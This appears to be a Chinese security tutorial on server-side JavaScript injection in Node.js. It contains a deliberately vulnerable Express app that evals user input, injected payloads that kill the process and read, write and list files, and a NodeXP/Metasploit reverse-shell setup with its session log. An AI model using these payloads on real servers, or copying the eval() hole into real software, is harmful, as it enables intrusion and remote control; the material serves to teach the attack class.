> 原文链接: https://www.anquanke.com//post/id/176150 


# SSJI —— Node.js漏洞审计系列（一）


                                阅读量   
                                **388539**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t01e7c935daa5177d42.png)](https://p2.ssl.qhimg.com/t01e7c935daa5177d42.png)



## 0x00 前言

hello我是掌控安全实验室的聂风，JavaScript在Node.js的帮助下变成了服务端脚本语言，那么既然是服务端脚本语言，就可能存在一些安全性问题。SSJI(服务器端JavaScript注入) 就是一种比较新颖的攻击手法。攻击者可以利用JS函数在服务器上执行恶意JS代码获得cmdshell。



## 0x01 环境搭建

工具：

[Node.js](https://nodejs.org/dist/v10.15.3/node-v10.15.3-x64.msi)

[https://nodejs.org/dist/v10.15.3/node-v10.15.3-x64.msi](https://nodejs.org/dist/v10.15.3/node-v10.15.3-x64.msi)

[Nodexp](https://github.com/esmog/nodexp/archive/master.zip)

https://github.com/esmog/nodexp/archive/master.zip

Metasploit-frameword(MSF)

搭建:

先傻瓜式的安装Node.js

安装好后Node.js 记得再安装一个express框架

npm install express –save (新版的Node.js都自带了npm)



## 0x02 SSJI危害

如果没有对输入进行检测，那么可能会容易受到攻击，攻击者可以利用JS函数在服务器上执行恶意JS代码。

可利用的函数有什么？

```
Eval()
setTimeout()
Setinterval()
Funtion()
```

例如：(Eval.js:)

```
var express = require('express');
var app = express();
app.get('/', function(req, res) `{` 
     var resp=eval(req.query.name);
     res.send('Response&lt;/br&gt;'+resp);
`}`);
app.listen(3002);
console.log('Server runing at http://127.0.0.1:3002/');
```

当我们使用Node.js去运行这个js的时候会在本地开启一个3002端口的WEB服务，然后他会获取GET方式传参上来的传参名为name的值，然后将获取到的值放在eval()函数中执行。

我们去访问这个端口

[![](https://p5.ssl.qhimg.com/t016fac5960f452048f.png)](https://p5.ssl.qhimg.com/t016fac5960f452048f.png)

然后我们可以对他进行GET传参，比如name=console.log(“hello World”);

[![](https://p4.ssl.qhimg.com/t019222d797285b76ad.png)](https://p4.ssl.qhimg.com/t019222d797285b76ad.png)

传参后就很明显执行了，在命令行中很明显的输出了Hello World!

那么我们既然能够执行输出，是不是能执行其他语句？比如一些恶意语句.

process.exit() / process.kill(process.pid)

还可以杀死他运行进程（NodeJs）

[![](https://p2.ssl.qhimg.com/t01eafd333753fa8227.png)](https://p2.ssl.qhimg.com/t01eafd333753fa8227.png)

进程被终结掉了。

基本上，攻击者可以在系统上执行/执行几乎任何操作（在用户权限限制内） 我们还可以尝试调用核心模块fs读取/列出当前目录下的文件名和文件夹名

```
res.end(require('fs').readdirSync('.').toString())
```

[![](https://p4.ssl.qhimg.com/t0112df5b3c0dafa4e1.png)](https://p4.ssl.qhimg.com/t0112df5b3c0dafa4e1.png)

我们也可以尝试调用核心模块fs写入文件(虽然没有回显，但是还是成功写入)

```
res.end(require('fs').writeFileSync('message.txt','hello'))
```

[![](https://p2.ssl.qhimg.com/t014c258a9b2028b97e.png)](https://p2.ssl.qhimg.com/t014c258a9b2028b97e.png)

我们也可以尝试调用核心模块fs去读取他的文件

```
res.end(require('fs').readFileSync('a.js','utf-8'))
```

[![](https://p3.ssl.qhimg.com/t0124d9fddf810ec333.png)](https://p3.ssl.qhimg.com/t0124d9fddf810ec333.png)

[![](https://p2.ssl.qhimg.com/t011723d4b2b3219a3f.png)](https://p2.ssl.qhimg.com/t011723d4b2b3219a3f.png)

如果目标的机器上面安装了node-cmd就可以调用cmd (为显示明了我去调用一个exe安装)

```
var nodeCmd = require('node-cmd');nodeCmd.run('360cse_9.5.0.138.exe');
```

[![](https://p2.ssl.qhimg.com/t01068f708a9ea3def7.png)](https://p2.ssl.qhimg.com/t01068f708a9ea3def7.png)

[![](https://p1.ssl.qhimg.com/t0153b1bd7b3bc3e618.png)](https://p1.ssl.qhimg.com/t0153b1bd7b3bc3e618.png)

很明显我们就调用了cmd



## 0x03 通过nodexp获取cmdshell

我们也可以尝试使用NodeXP工具加MSF来成功的获取一个cmdshell

使用方法：

GET:  python nodexp.py –url=http://localhost:3001/?name=[INJECT_HERE]<br>
POST:  python nodexp.py –url=http://localhost:3001/post.js –pdata=username=[INJECT_HERE]

[![](https://p3.ssl.qhimg.com/t010e5aae1f818acd82.png)](https://p3.ssl.qhimg.com/t010e5aae1f818acd82.png)

[![](https://p4.ssl.qhimg.com/t01301ef0ab05b8a431.png)](https://p4.ssl.qhimg.com/t01301ef0ab05b8a431.png)

[![](https://p2.ssl.qhimg.com/t014dd3f44a79baced0.png)](https://p2.ssl.qhimg.com/t014dd3f44a79baced0.png)

设置一个攻击机器的IP(装有MSF)

[![](https://p3.ssl.qhimg.com/t01e2b0f79fd6f1adca.png)](https://p3.ssl.qhimg.com/t01e2b0f79fd6f1adca.png)

设定端口

[![](https://p2.ssl.qhimg.com/t01e2b0f79fd6f1adca.png)](https://p2.ssl.qhimg.com/t01e2b0f79fd6f1adca.png)

然后会自动运行一个MSF 自动配置好

[![](https://p2.ssl.qhimg.com/t01ba748d97e7b88051.png)](https://p2.ssl.qhimg.com/t01ba748d97e7b88051.png)

选择1去打一个cmdshell

[![](https://p3.ssl.qhimg.com/t01ef319c98e5496523.png)](https://p3.ssl.qhimg.com/t01ef319c98e5496523.png)

成功返回一个session

[![](https://p4.ssl.qhimg.com/t01537dea496a54cce2.png)](https://p4.ssl.qhimg.com/t01537dea496a54cce2.png)

选中 sessions -i 1 （然后会卡，直接恩回车就行）

[![](https://p2.ssl.qhimg.com/t010a7163f00d900b4b.png)](https://p2.ssl.qhimg.com/t010a7163f00d900b4b.png)

成功获得cmdshell

MSF运行语句：

```
[*] Processing /root/nodexp-master/scripts/nodejs_shell.rc for ERB directives.
resource (/root/nodexp-master/scripts/nodejs_shell.rc)&gt; use exploit/multi/handler
resource (/root/nodexp-master/scripts/nodejs_shell.rc)&gt; set payload nodejs/shell_reverse_tcp
payload =&gt; nodejs/shell_reverse_tcp
resource (/root/nodexp-master/scripts/nodejs_shell.rc)&gt; set lhost 172.16.0.160
lhost =&gt; 172.16.0.160
resource (/root/nodexp-master/scripts/nodejs_shell.rc)&gt; set lport 4570
lport =&gt; 4570
resource (/root/nodexp-master/scripts/nodejs_shell.rc)&gt; set ExitOnSession true
ExitOnSession =&gt; true
resource (/root/nodexp-master/scripts/nodejs_shell.rc)&gt; set InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter'
InitialAutoRunScript =&gt; post/multi/manage/shell_to_meterpreter
resource (/root/nodexp-master/scripts/nodejs_shell.rc)&gt; spool /root/nodexp-master/scripts/nodejs_shell.rc.output.txt
[*] Spooling to file /root/nodexp-master/scripts/nodejs_shell.rc.output.txt...
resource (/root/nodexp-master/scripts/nodejs_shell.rc)&gt; exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.0.160:4570 
msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (172.16.0.160:4570 -&gt; 172.16.0.236:51759) at 2019-03-21 18:01:56 +0800
[*] Session ID 1 (172.16.0.160:4570 -&gt; 172.16.0.236:51759) processing InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter'
[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
```



## 0x04 总结

现在使用JavaScript开发的网站将越来越多，但是SSJI(服务器端JavaScript注入) 并没有受到重视，还属于比较冷门的攻击手法，但是该攻击手法危害高，应当重视起来。Node.js 安全性的范围很大，该文章作为一个引子，[掌控安全实验室](http://zkaq.org)将持续跟进分析，希望大家支持！下期见。
